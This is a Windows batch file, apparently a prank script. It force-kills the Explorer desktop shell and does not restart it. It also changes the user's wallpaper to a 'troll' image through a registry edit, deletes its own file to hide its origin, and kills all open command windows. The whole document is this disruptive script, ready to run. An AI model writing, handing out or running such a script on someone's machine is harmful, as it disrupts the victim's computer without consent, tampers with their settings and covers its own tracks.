@echo off
taskkill /f /im explorer.exe
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d troll.png /f 
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
del "%~f0"
taskkill /f /im cmd.exe